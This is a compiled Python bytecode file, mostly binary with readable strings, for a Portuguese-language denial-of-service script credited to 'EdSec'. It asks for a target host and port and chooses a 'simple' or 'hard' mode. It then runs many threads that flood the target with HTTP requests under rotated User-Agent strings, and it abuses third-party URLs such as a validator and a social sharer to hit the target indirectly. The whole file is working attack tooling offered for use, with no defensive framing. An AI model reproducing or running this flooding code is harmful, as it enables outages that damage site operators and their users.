3
���Z�  �               @   s^  d dl mZ d dlmZ d dlZd dlZd dlZd dlZd dlZd dl	Z
d dlZdZedd�Zeje� ed� ed�Zed	kr�d
Znedkr�dZnej�  ed�Zed�Zdd� Zdd� Zdd� Zdd� Zdd� Zdd� Zedd�Zej� aej �  e� Z!e� Z"e#dk�rZe$ej%�dk �r4ede d e d  � e�  e�  ej&d!� y0ejej'ej(�Z)e)j*ee+e�f� e)j,d"� W n6 ej-k
�r� Z. zed#� ej�  W Y ddZ.[.X nX x�xFe/e�D ]:Z0ej1ed$�Z2d%e2_3e2j4�  ej1ed$�Z5d%e5_3e5j4�  �q�W ej� Z4d Z6x:e6d&k�r"d Z6ej&d'� e6d" Z6e!j7e6� e"j7e6� �q
W e!j8�  e"j8�  �q�W dS )(�    )�Queue)�OptionParserNz�Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Connection: keep-alive
zheaders.txt�wu�   
 :::::::::::::::::::::::::::::::::::::::::

 [+] Script para Negação de Serviço

 [+] Desenvolvido por EdSec

 :::::::::::::::::::::::::::::::::::::::::

 [ 1 ] Negação de serviço SIMPLES
 [ 2 ] Negação de serviço HARD (warning)
z [+] Escolha o tipo: �1��   �2i�  z
 [+] Digite o alvo:  z [+] Digite a porta: c               C   sN   g a t jd� t jd� t jd� t jd� t jd� t jd� t jd� t S )Nz>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14zJMozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0zRMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3zjMozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)zyMozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7zmMozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)zXMozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1)�uagent�append� r
   r
   �#/storage/emulated/legacy/negacao.py�
user_agent,   s    






r   c               C   s   g a t jd� t jd� t S )Nz"http://validator.w3.org/check?uri=z,http://www.facebook.com/sharer/sharer.php?u=)�botsr	   r
   r
   r
   r   �my_bots9   s    

r   c             C   sb   yFx@t jjt jj| dtjt�id��}td� td� tj	d� qW W n   tj	d� Y nX d S )Nz
User-Agent)�headersz (+++++++> EdSec <++++++++)z (++++++++> EdSec <+++++++)g�������?)
�urllibZrequestZurlopenZRequest�random�choicer   �print�time�sleep)ZurlZreqr
   r
   r   �bot_hammeringA   s    "r   c             C   s�   y�x�t dt d tjt� d t �jd�}tjtjtj	�}|j
ttt�f� |j|ttt�f�r~|jd� td� td� n|jd� td� tjd	� qW W n6 tjk
r� } ztd
� tjd	� W Y d d }~X nX d S )NzGET / HTTP/1.1
Host: z

 User-Agent: �
zutf-8�   z (+++++++> EdSec <++++++++)z (++++++++> EdSec <+++++++)z [#]=> ............... g�������?u    [!] Conexão lenta  ! ! !)�str�hostr   r   r   �data�encode�socket�AF_INET�SOCK_STREAM�connect�int�portZsendtoZshutdownr   r   r   �error)�itemZpacket�s�er
   r
   r   �down_itL   s    (


r'   c              C   s"   xt j� } t| � t j�  qW d S )N)�q�getr'   �	task_done)r$   r
   r
   r   �dos_   s    r+   c              C   s0   x*t j� } ttjt�d t � t j�  qW d S )Nzhttp://)r   r)   r   r   r   r   r   r*   )r$   r
   r
   r   �dos2f   s    r,   �rZ__main__�   u   

 [+] Iniciando negação em: z	, Porta: z

�   r   z2 [+] Verifique o host e a porta, e tente novamente)�targetTi  g�������?)9Zqueuer   Zoptparser   r   �sysr   Z	threadingZloggingZurllib.requestr   r   Zhh�openZnk�
writelinesr   �inputZtipo_XZtipoX�exitr   r"   r   r   r   r'   r+   r,   r   �readr   �closer(   r   �__name__�len�argvr   r   r   r%   r    r!   Z
settimeoutr#   r&   �range�iZThread�tZdaemon�startZt2r$   Zput�joinr
   r
   r
   r   �<module>   st   8







